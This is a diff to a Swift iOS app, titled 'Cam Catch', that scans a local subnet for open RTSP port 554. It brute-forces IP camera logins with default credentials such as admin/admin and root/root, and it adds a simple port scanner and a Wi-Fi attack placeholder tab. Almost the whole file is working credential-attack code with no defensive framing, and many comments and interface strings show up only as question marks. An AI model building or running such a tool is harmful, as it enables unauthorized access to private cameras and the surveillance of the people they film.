@@ -3,47 +3,45 @@ import Network
 
 struct Credential { let user: String; let pass: String }
 
-class CameraScanner: ObservableObject {
+class NetworkTool: ObservableObject {
     @Published var logs: String = ""
     @Published var isScanning: Bool = false
     private var credentials: [Credential] = []
     
-    init() { loadWordlist() }
-    
-    func loadWordlist() {
-        guard let path = Bundle.main.path(forResource: "passwords", ofType: "txt"),
-              let content = try? String(contentsOfFile: path) else {
-            log("[-] passwords.txt not found."); return
-        }
-        for line in content.components(separatedBy: .newlines) {
-            let parts = line.split(separator: ":", maxSplits: 1).map(String.init)
-            if parts.count == 2 { credentials.append(Credential(user: parts[0], pass: parts[1])) }
-            else if parts.count == 1 && !parts[0].isEmpty {
-                credentials.append(Credential(user: "admin", pass: parts[0]))
-                credentials.append(Credential(user: "root", pass: parts[0]))
-            }
-        }
-        log("[*] Loaded \(credentials.count) passwords.")
+    init() {
+        // ????? ????? ??????? ???????. ? ?????? ?????? ?? Bundle
+        credentials = [Credential(user: "admin", pass: "admin"), Credential(user: "admin", pass: "12345"), Credential(user: "root", pass: "root")]
     }
     
     func log(_ text: String) { DispatchQueue.main.async { self.logs += text + "\n" } }
+    func clearLogs() { logs = "" }
     
-    func startScan(ipRange: String) {
-        isScanning = true; logs = ""
+    func startScan(ipRange: String, mode: String) {
+        isScanning = true; clearLogs()
         Task {
+            log("[*] ?????? ??????: \(mode) ?? ??????? \(ipRange).0/24")
             for i in 1...254 {
                 let ip = "\(ipRange).\(i)"
-                await checkHost(ip: ip)
+                await checkHost(ip: ip, mode: mode)
             }
-            DispatchQueue.main.async { self.isScanning = false; self.log("[*] Scan complete.") }
+            DispatchQueue.main.async { self.isScanning = false; self.log("[*] ???????????? ?????????.") }
         }
     }
     
-    func checkHost(ip: String) async {
-        let rtspOpen = await checkPort(host: ip, port: 554)
-        if rtspOpen {
-            log("[+] \(ip) RTSP port open. Bruteforcing...")
-            await bruteRTSP(ip: ip)
+    func checkHost(ip: String, mode: String) async {
+        if mode == "??????" {
+            let rtspOpen = await checkPort(host: ip, port: 554)
+            if rtspOpen {
+                log("[+] \(ip) RTSP ??????. ????????...")
+                await bruteRTSP(ip: ip)
+            }
+        } else if mode == "?????" {
+            let p80 = await checkPort(host: ip, port: 80)
+            let p443 = await checkPort(host: ip, port: 443)
+            let p22 = await checkPort(host: ip, port: 22)
+            if p80 || p443 || p22 {
+                log("[+] \(ip) ???????. 80:\(p80) 443:\(p443) 22:\(p22)")
+            }
         }
     }
     
@@ -56,35 +54,26 @@ class CameraScanner: ObservableObject {
                 else if case .failed = state, !hasResumed { hasResumed = true; cont.resume(returning: false) }
             }
             conn.start(queue: .global())
-            DispatchQueue.global().asyncAfter(deadline: .now() + 1.0) {
+            DispatchQueue.global().asyncAfter(deadline: .now() + 0.5) {
                 if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: false) }
             }
         }
     }
     
     func bruteRTSP(ip: String) async {
-        let chunkSize = 50
-        for i in stride(from: 0, to: credentials.count, by: chunkSize) {
-            let chunk = Array(credentials[i..<min(i+chunkSize, credentials.count)])
-            let found = await withTaskGroup(of: String?.self) { group -> String? in
-                for cred in chunk {
-                    group.addTask { return await self.tryRTSP(ip: ip, user: cred.user, pass: cred.pass) }
-                }
-                for await res in group { if let s = res { group.cancelAll(); return s } }
-                return nil
-            }
-            if let url = found { log("[!!!] FOUND: \(url)"); return }
+        for cred in credentials {
+            let found = await tryRTSP(ip: ip, user: cred.user, pass: cred.pass)
+            if let url = found { log("[!!!] ?????: \(url)"); return }
         }
-        log("[-] No password found for \(ip).")
+        log("[-] \(ip) ?????? ?? ??????.")
     }
     
     func tryRTSP(ip: String, user: String, pass: String) async -> String? {
         return await withCheckedContinuation { cont in
             let conn = NWConnection(host: NWEndpoint.Host(ip), port: 554, using: .tcp)
             var hasResumed = false
-            let authData = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
-            let req = "DESCRIBE rtsp://\(ip):554/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic \(authData)\r\n\r\n"
-            
+            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
+            let req = "DESCRIBE rtsp://\(ip):554/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic \(auth)\r\n\r\n"
             conn.stateUpdateHandler = { state in
                 if case .ready = state {
                     conn.send(content: req.data(using: .utf8), completion: .contentProcessed({ _ in
@@ -95,12 +84,10 @@ class CameraScanner: ObservableObject {
                             if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: nil) }
                         }
                     }))
-                } else if case .failed = state {
-                    if !hasResumed { hasResumed = true; cont.resume(returning: nil) }
                 }
             }
             conn.start(queue: .global())
-            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
+            DispatchQueue.global().asyncAfter(deadline: .now() + 1.0) {
                 if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: nil) }
             }
         }
@@ -108,23 +95,45 @@ class CameraScanner: ObservableObject {
 }
 
 struct ContentView: View {
-    @StateObject private var scanner = CameraScanner()
+    @StateObject private var tool = NetworkTool()
     @State private var ipRange: String = "192.168.1"
     
     var body: some View {
-        NavigationView {
-            VStack {
-                HStack {
-                    TextField("Subnet", text: $ipRange)
-                        .textFieldStyle(RoundedBorderTextFieldStyle()).keyboardType(.numbersAndPunctuation)
-                    Button("Scan") { scanner.startScan(ipRange: ipRange) }
-                        .disabled(scanner.isScanning).buttonStyle(.borderedProminent)
-                }.padding()
-                ScrollView {
-                    Text(scanner.logs).font(.system(.footnote, design: .monospaced))
-                        .frame(maxWidth: .infinity, alignment: .leading).padding()
-                }
-            }.navigationTitle("CamSweep")
+        TabView {
+            // ??????? 1: ??????
+            NavigationView {
+                VStack {
+                    HStack {
+                        TextField("??????? (192.168.1)", text: $ipRange)
+                            .textFieldStyle(RoundedBorderTextFieldStyle()).keyboardType(.numbersAndPunctuation)
+                        Button("Scan") { tool.startScan(ipRange: ipRange, mode: "??????") }
+                            .disabled(tool.isScanning).buttonStyle(.borderedProminent)
+                    }.padding()
+                    ScrollView { Text(tool.logs).font(.system(.footnote, design: .monospaced)).padding() }
+                }.navigationTitle("Cam Catch")
+            }.tabItem { Label("??????", systemImage: "camera") }
+            
+            // ??????? 2: ?????
+            NavigationView {
+                VStack {
+                    HStack {
+                        TextField("???????", text: $ipRange)
+                            .textFieldStyle(RoundedBorderTextFieldStyle()).keyboardType(.numbersAndPunctuation)
+                        Button("Scan") { tool.startScan(ipRange: ipRange, mode: "?????") }
+                            .disabled(tool.isScanning).buttonStyle(.borderedProminent)
+                    }.padding()
+                    ScrollView { Text(tool.logs).font(.system(.footnote, design: .monospaced)).padding() }
+                }.navigationTitle("Port Scanner")
+            }.tabItem { Label("?????", systemImage: "network") }
+            
+            // ??????? 3: Wi-Fi (???????? ??-?? ??????????? iOS)
+            NavigationView {
+                VStack(spacing: 20) {
+                    Image(systemName: "wifi.slash").font(.largeTitle).foregroundColor(.red)
+                    Text("Wi-Fi ???????? ? ???????? ??????????.")
+                    Text("iOS ????????? ?????? ?????? ? Wi-Fi ????. ??? ???? ??????? ????? Android ? Root ??? ??????? ??????? (??? ?? Flipper Zero).").multilineTextAlignment(.center).padding()
+                }.navigationTitle("Wi-Fi ??????")
+            }.tabItem { Label("Wi-Fi", systemImage: "wifi") }
         }
     }
 }
